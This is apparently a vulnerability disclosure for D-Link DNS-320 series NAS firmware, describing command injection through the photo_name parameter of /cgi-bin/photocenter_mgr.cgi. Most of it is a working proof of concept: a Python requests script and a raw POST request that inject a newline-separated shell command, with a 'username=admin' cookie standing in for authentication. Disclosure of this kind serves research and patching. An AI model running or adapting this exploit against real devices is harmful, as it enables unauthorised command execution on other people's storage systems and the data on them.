# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L  all firmware version
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_move_photo function of the file /cgi-bin/photocenter_mgr.cgi.  The variable `photo_name` is passed from a POST request and is assigned to `v8` via the `sprintf` function at line 60. It is then passed into `v4` and invoked by the `system` command,  the `SpecSymbol2BackSlash` function did not work  which leads to command execution. ![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723392351533-8af7fe45-fab8-4e0e-9259-04c233438c21.png#averageHue=%23fdfdfb&clientId=ud7a282ba-29c6-4&from=paste&height=402&id=ufb891253&originHeight=596&originWidth=702&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=74374&status=done&style=none&taskId=ue890aafc-1758-417b-8dc2-5b40e358e0e&title=&width=474)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723392201018-b593177e-c596-4ff7-be9e-80e9917d2cce.png#averageHue=%23fefefc&clientId=ud7a282ba-29c6-4&from=paste&height=221&id=u856c5829&originHeight=249&originWidth=1200&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=35665&status=done&style=none&taskId=uac1f638b-b8e6-4390-94f6-436b64d0d01&title=&width=1066.6666666666667)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/photocenter_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_move_photo&photo_name=%0atouch%09/tmp/444%0a&move_to=/tmp/111&move_from=/tmp/333&rp=10&page=10&r=10&date=19&album_name=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/photocenter_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Referer: http://192.168.0.32/photo_center/index.html
Cookie: username=admin
Priority: u=1

cmd=cgi_move_photo&photo_name=%0atouch%09/tmp/444%0a&move_to=/tmp/111&move_from=/tmp/333&rp=10&page=10&r=10&date=19&album_name=/tmp/
```

